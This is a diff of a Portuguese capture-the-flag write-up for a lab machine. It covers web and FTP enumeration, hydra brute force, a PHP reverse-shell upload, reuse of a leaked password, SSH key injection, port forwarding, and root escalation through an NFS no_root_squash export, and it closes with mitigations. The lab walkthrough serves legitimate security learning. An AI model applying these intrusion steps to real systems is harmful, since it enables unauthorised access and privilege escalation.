@@ -4,13 +4,12 @@ Eai galera, vamos para mais uma!
 
 ![](img/a5800e570e78bcf5526fe0ce1a245d21.png)
 
-Nessa sala teremos:
-
-*
-*
-*
-* e muito mais.
-
+Nessa sala vamos ver:
+- Enumeração web e FTP
+- Credenciais fracas + brute force
+- Reverse shell via upload FTP
+- Lateral movement via senha reutilizada
+- Priv esc via NFS misconfig (no_root_squash)
 ---
 
 ## 1: Recon
@@ -31,15 +30,15 @@ Service Info: OS: Unix
 ```
 Oque as Flags dizem? 
 
-1. -sS: Sync scan - Varedura com o apeto de mão de 3 vias;
+1. -sS: Sync scan - Vareedura com o aperto de mão de 3 vias;
 
-	* com Nosso computador enviara um pacote (syn), se a porta estiver aberta, o servidor retornará um outro pacote (syn-ack), por sua vez retornara um aperto de confirmação (ack). Assim podemos determinar se uma porta está ou não aberta.
+	* com Nosso computador enviara um pacote (syn), se a porta estiver aberta, o servidor retornará um outro pacote (syn-ack), por sua vez retornará um aperto de confirmação (ack). Assim podemos determinar se uma porta está ou não aberta.
 
 2. -sV: Tentar indentificar as versãos
 
 3. -sC: Usa um script default do nmap; Como traceroute, http-title, OS (sistema operacional) e outros.
 
-Certo, 3 portas identificadas; Vamos a busca por diretorios:
+Certo, 3 portas identificadas; Vamos a busca por diretórios:
 
 ```BASH
 ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
@@ -67,9 +66,9 @@ backup.zip  CustomerDetails.xlsx.gpg  ov3  priv.key
 
 Esse é um arquivo de excel:
 
-![](img/87d967ed7ac730cdfadba9fc1a2f1037.png){: .centralizar}
+![](img/87d967ed7ac730cdfadba9fc1a2f1037.png)
 
-Certo, temos possiveis credenciais... Ao ataque e já reparem a webshell.
+Certo, temos possiveis credenciais... Ao ataque e já preparem a webshell `/usr/share/webshells/php/php-reverse-shell.php.
 
 ```BASH
 hydra -L user.txt -P pass.txt ftp://$IP
@@ -122,7 +121,7 @@ Agora é só recuperarmos nossa shell!
 
 ![](img/003c988e24e5266eefccf77227d8ab45.gif)
 
-Depois de uma breve eumeração, temos os seguintes usuarios na maquina:
+Depois de uma breve enumeração, temos os seguintes usúarios na máquina:
 
 ```BASH
 sh-4.4$ cat /etc/passwd
@@ -134,19 +133,7 @@ paradox:x:1001:1001::/home/paradox:/bin/bash
 ...
 ```
 
-Bom, também temos um caminho para o root definido:
-
-```BASH
-sh-4.4$ cat /etc/exports
-
-/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
-```
- 
-Essa descrição se encaixa perfeitamente na desscrição da CVE-2016-0911. Mas vamos com calma.
-
-Primeiro vamos tentar escalar lateralmente para o paradox ou james.
-
-Por falar em paradox, aquelas credenciais iniciais funcionam!
+Bom, aquelas credênciais iniciais funcionam!
 
 ```BASH
 sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash");'
@@ -160,7 +147,7 @@ Password: ShibesAreGreat123
 ls
 authorized_keys  id_rsa.pub
 ```
-Bom primeiro precisamos de injetar nossas chaves ssh aqui ( acho vergonhoso explicar isso):
+Bom primeiro precisamos de injetar nossas chaves ssh:
 
 ```BASH
 [paradox@ip-10-66-189-170 .ssh]$ ssh-keygen -f paradox
@@ -168,12 +155,11 @@ Bom primeiro precisamos de injetar nossas chaves ssh aqui ( acho vergonhoso expl
 [paradox@ip-10-66-189-170 .ssh]$ cat paradox > authorized_keys
 ```
 
-> Man, se não conhece nada do que foi mostrado, considere ler o artigo de um amigo (fim do post!)
-
 
 Bom, voce deve está se perguntando "porque não tentamos o ssh antes, já que tinhamos as credenciais?" - A resposta é simples, o servidor está configurado para nao aceitar:
 
 ```BASH
+> ssh paradox@$IP
 paradox@10.66.189.170: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
 
   ssh paradox@$IP -i id_rsa 
@@ -194,12 +180,17 @@ Para começar podemos ver as portas que estão ouvindo no nosso alvo com `ss -tu
  nc 10.66.189.170 2049
 
 (UNKNOWN) [10.66.189.170] 2049 (nfs) : No route to host
+
+sh-4.4$ cat /etc/exports
+
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
 ```
-[NFS](https://hacktricks.wiki/pt/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html#squashing-basic-info)
+ 
+Essa descrição se encaixa perfeitamente na desscrição da CVE-2016-0911. Mas vamos com calma.[NFS](https://hacktricks.wiki/pt/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html#squashing-basic-info)
 
 Entretanto, não podemos acessar. Isso acontece por causa de regras do firewall.
 
-Mas nem tudo está perdido, podemos usar uma tecnica chmada [redirecionamento de portas](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling).
+Mas nem tudo está perdido, podemos usar uma técnica chamada [redirecionamento de portas](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling).
 
 ```BASH
  ssh paradox@$IP -i id_rsa -L 2049:localhost:2049
@@ -223,7 +214,7 @@ drwx------  2 hex  hex   61 nov  7  2020 .ssh
 -rw-------  1 hex  hex   38 nov 17  2020 user.flag
 
 ```
-GG Rapaziada, Agora podemos pegar a chaves do usuario james e seguir com uma escalação rumo ao root. 
+GG Rapaziada, Agora podemos pegar a chaves do usúario james e seguir com uma escalação rumo ao root. 
 
 ```BASH
 ssh james@10.66.189.170 -i id_rsa
@@ -240,9 +231,9 @@ Certo, agora só resta sermos root!
 Como temos o NFS montado no nosso diretorio `/tmp/pe`, podemos trocar o proprietario do binario do bash. Em um terceiro terminal:
 
 ```BASH
-  cd /tmp/pe
+> cd /tmp/pe
  
-  ls    
+> ls    
 bash  user.flag
 
 > chown root:root bash
@@ -252,7 +243,18 @@ De volta ao termianal com ssh (james):
 
 ![](img/1949450bac52e00ac32250f0d49fa960.png)
 
----
-Obrigado por ler; Abaixo está o Artigo que mencionei
+### Pega flags:
 
-https://blog.dclabs.com.br/2016/05/wanna-be-pentester.html
+- user.txt em /home/james
+
+- root.txt em /root
+
+### Lições aprendidas / Mitigações
+
+- Nunca reutilizar senhas.
+
+- Cuidado com exports NFS com no_root_squash.
+
+- Backups expostos = risco alto.
+
+- SSH pubkey-only + firewall bom.
